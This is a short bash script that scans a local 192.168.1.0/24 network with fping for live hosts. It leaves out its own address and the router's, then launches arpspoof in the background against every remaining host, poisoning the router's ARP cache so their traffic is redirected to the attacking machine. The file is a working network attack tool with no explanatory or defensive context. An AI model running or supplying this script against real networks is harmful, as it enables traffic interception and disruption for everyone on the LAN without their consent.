#!/bin/bash

result=$(sudo fping -a -g 192.168.1.0/24 2>/dev/null)

my_ip=$(hostname -I | awk '{print $1}')

router_ip="192.168.1.1"

result=$(grep -v -e "$my_ip" -e "$router_ip" <<< "$result")

for ip in $result; do
    sudo arpspoof -i eth0 -t 192.168.1.1 "$ip" &
done
